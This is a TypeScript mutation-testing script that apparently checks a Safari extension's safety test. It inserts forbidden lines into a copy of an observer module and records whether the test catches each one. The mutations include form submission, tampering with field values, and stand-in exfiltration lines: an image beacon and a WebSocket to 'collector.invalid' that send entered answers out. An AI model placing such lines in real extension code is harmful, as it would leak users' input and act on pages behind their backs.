// Inserts page-writing / submitting / exfiltrating lines into a copy of entry-observer.ts
// and runs the module's own safety test (tests/p0-12-observer-safety.test.ts) against each.
import { mkdirSync, readFileSync, writeFileSync, copyFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';

const SRC = '/tmp/qa-71f/repo/apps/safari-extension/fixture/src/entry-observer.ts';
const TEST = '/tmp/qa-71f/repo/apps/safari-extension/tests/p0-12-observer-safety.test.ts';
const src = readFileSync(SRC, 'utf8');
const TEXT = '    known.set(el, after);\n';
const CHOICE = '      known.set(choice, after);\n';
const mutations = {
  requestSubmit: [TEXT, "    (el as HTMLInputElement).form?.requestSubmit();\n"],
  protoClick: [CHOICE, '      HTMLElement.prototype.click.call(choice);\n'],
  objectAssignValue: [TEXT, "    Object.assign(el, { value: '42' });\n"],
  bracketValue: [TEXT, "    (el as HTMLInputElement)['value'] = '42';\n"],
  compoundValue: [TEXT, "    (el as HTMLInputElement).value += '0';\n"],
  setAttributeChecked: [CHOICE, "      choice.setAttribute('checked', '');\n"],
  reflectChecked: [CHOICE, "      Reflect.set(choice, 'checked', !choice.checked);\n"],
  logicalAssignChecked: [CHOICE, '      choice.checked ||= true;\n'],
  imageBeacon: [TEXT, "    new win.Image().src = 'https://collector.invalid/?a=' + encodeURIComponent(after);\n"],
  webSocket: [TEXT, "    new WebSocket('wss://collector.invalid').onopen = null;\n"],
  indexedDB: [TEXT, "    win.indexedDB.open('lc-answers');\n"],
  blurSelect: [TEXT, '    (el as HTMLInputElement).blur?.();\n'],
};
const results = {};
for (const [name, [anchor, line]] of Object.entries(mutations)) {
  if (!src.includes(anchor)) throw new Error(`anchor missing for ${name}`);
  const root = `/tmp/qa-71f/work/entries-observer/mut/${name}/apps/safari-extension`;
  mkdirSync(`${root}/fixture/src`, { recursive: true });
  mkdirSync(`${root}/tests`, { recursive: true });
  writeFileSync(`${root}/fixture/src/entry-observer.ts`, src.replace(anchor, anchor + line));
  copyFileSync(TEST, `${root}/tests/p0-12-observer-safety.test.ts`);
  let status;
  try {
    const o = execFileSync(process.execPath, ['--test', '--test-isolation=none', 'tests/p0-12-observer-safety.test.ts'], { cwd: root, encoding: 'utf8' });
    status = /# pass 1/.test(o) || /ℹ pass 1/.test(o) ? 'SURVIVES (safety test passes)' : o;
  } catch (e) {
    status = 'KILLED (safety test fails)';
  }
  results[name] = { inserted: line.trim(), status };
}
console.log(JSON.stringify(results, null, 1));
